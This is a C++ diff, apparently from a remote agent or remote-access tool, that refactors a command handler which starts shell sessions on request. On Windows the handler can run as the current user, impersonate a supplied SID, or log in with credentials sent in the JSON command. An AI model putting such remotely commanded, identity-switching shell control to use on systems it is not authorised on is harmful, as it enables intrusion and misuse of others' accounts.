@@ -53,29 +53,40 @@ std::string CommandHandler::onStartShell(const Document& req)
 {
     if (!shell_) shell_ = std::make_unique<execution::Shell>();
 #ifdef _WIN32
-    std::wstring sid = win32::user::get_current_user_sid();
-    const Value* cmd_obj = nullptr;
-    if (json::getObject(req, "command", cmd_obj)) {
-        std::string user_name;
-        if (json::getString(*cmd_obj, "user_name", user_name) && !user_name.empty()) {
-            std::wstring wname = win32::charToWchar(user_name.c_str());
-            std::wstring tmp = win32::user::get_sid_by_user_name(wname);
-            if (!tmp.empty()) sid = std::move(tmp);
+    ShellLaunchDesc desc;                      // default = CurrentUser
+
+    const Value* cmd = nullptr;
+    if (json::getObject(req, "command", cmd))
+    {
+        std::string mode;
+        json::getString(*cmd, "creation_type", mode);
+
+        if (mode == "impersonate_sid")
+        {
+            std::string sid;
+            if (!json::getString(*cmd, "sid", sid) || sid.empty())
+                return makeError("sid missing");
+            desc.kind = ShellLaunchKind::ImpersonateSid;
+            desc.sid  = win32::charToWchar(sid.c_str());
         }
-        std::string sid_str;
-        if (json::getString(*cmd_obj, "sid", sid_str) && !sid_str.empty()) {
-            sid = win32::charToWchar(sid_str.c_str());
+        else if (mode == "credentials")
+        {
+            std::string user, pwd;
+            json::getString(*cmd, "username", user);
+            json::getString(*cmd, "password", pwd);
+            desc.kind     = ShellLaunchKind::Credentials;
+            desc.username = win32::charToWchar(user.c_str());
+            desc.password = win32::charToWchar(pwd.c_str());
         }
+        /* else keep CurrentUser */
     }
 
-    bool created = shell_->create_by_sid(sid);
-    DARKSCRY_LOG("Shell session initiated for SID: " + win32::narrow(sid) + (created ? " true" : " false"), Logger::Level::Debug);
+    bool ok = shell_->create(desc);
 #else
-    bool created = shell_->create();
-    DARKSCRY_LOG(std::string("Shell session initiated ") + (created ? "true" : "false"), Logger::Level::Debug);
+    bool ok = shell_->create();                // Linux / macOS path
 #endif
-    return created ? makeSuccess(Value(rapidjson::kNullType))
-                   : makeError("Shell start failed");
+    return ok ? makeSuccess(rapidjson::Value(rapidjson::kNullType))
+              : makeError("Shell start failed");
 }
 
 std::string CommandHandler::onRunCommand(const Document& req)
